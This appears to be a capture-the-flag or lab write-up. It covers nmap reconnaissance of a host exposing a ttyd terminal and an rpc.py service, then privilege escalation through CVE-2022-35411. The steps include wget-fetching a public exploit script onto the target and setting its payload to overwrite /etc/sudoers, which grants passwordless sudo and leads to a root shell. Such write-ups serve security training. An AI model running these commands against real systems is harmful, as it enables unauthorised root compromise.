# Information Gathering 

Nmap Scans:
Completed Service scan at 10:47, 6.37s elapsed (3 services on 1 host)  
NSE: Script scanning 192.168.XXX.XXX.  
Initiating NSE at 10:47  
Completed NSE at 10:47, 10.91s elapsed  
Initiating NSE at 10:47  
Completed NSE at 10:47, 1.25s elapsed  
Initiating NSE at 10:47  
Completed NSE at 10:47, 0.00s elapsed  
Nmap scan report for 192.168.XXX.XXX  
Host is up (0.050s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT      STATE SERVICE VERSION  
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)  
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)  
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)  
8000/tcp  open  http    ttyd 1.7.3-a2312cb (libwebsockets 3.2.0)  
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)  
|_http-title: ttyd - Terminal  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
65432/tcp open  http    Uvicorn  
| http-methods:    
|_  Supported Methods: POST  
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).  
|_http-server-header: uvicorn  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
NSE: Script Post-scanning.  
Initiating NSE at 10:47  
Completed NSE at 10:47, 0.00s elapsed  
Initiating NSE at 10:47  
Completed NSE at 10:47, 0.00s elapsed  
Initiating NSE at 10:47  
Completed NSE at 10:47, 0.00s elapsed  
Read data files from: /usr/share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 104.99 seconds  
          Raw packets sent: 66254 (2.915MB) | Rcvd: 66206 (2.649MB)

==Available ports 22, 8000, 65432 == 


The target IP address does not provide any connections directly, however we are able to access a working terminal directly on port 8000. 

# Service Enumeration

Since we have a direct foothold on the machine, we can directly look for opportunities to escalate out privileges. 

On port 8000, we are logged in as, "user@pc"


# Privilege Escalation

After directory enumeration and checking from known privilege escalation paths, there is no direct path to escalate privileges on our machine. However, under the */opt* directory, we find a file running *rpc.py.*

For reference, rpc.py is an RPC framework based on ASGI/WSGI that allows users deploy servers and run other functions as well.

The reason this program is so important is because it is found under the *opt* directory which is typically reserved for "optional" programs. 

Upon looking over the code more thoroughly, we see that is it being directly run by the root user. 

Researching the rcp.py code shows that there is a known CVE that allows for remote code execution -> CVE-2022-35411


We can use the exploit code from this public GitHub to potentially escalate our privileges -> https://github.com/ehtec/rpcpy-exploit

In order to get the exploit file directory on our target machine we run

	wget https://raw.githubusercontent.com/ehtec/rpcpy-exploit/refs/heads/main/rpcpy-exploit.py

This command will pull the raw file directly into your current working directory.

Now, to run the exploit we need to modify the code to our specification.

There are multiple payloads that are effective to achieve a root shell, however we are going to directly change the */etc/sudoers* file to allow all users to run sudo.

	1) Open the file with our text editor and edit the "exec_command()" function in the main method
	
	2) Expected command -> `echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

	3) Add teh executable privilege to the file -> chmod +x 

	4) Run the exploit -> python3 rpcpy-exploit.py


With success, the command executes with no issues. To verify that the exploit works, we can check the available sudo commands for the "user" user

	sudo -l

We can now run sudo without restrictions! To gain access to the root user, all that is required is to switch users directly

	sudo su

Success! we have achieved a root shell. The proof flag can be found in the root directory.
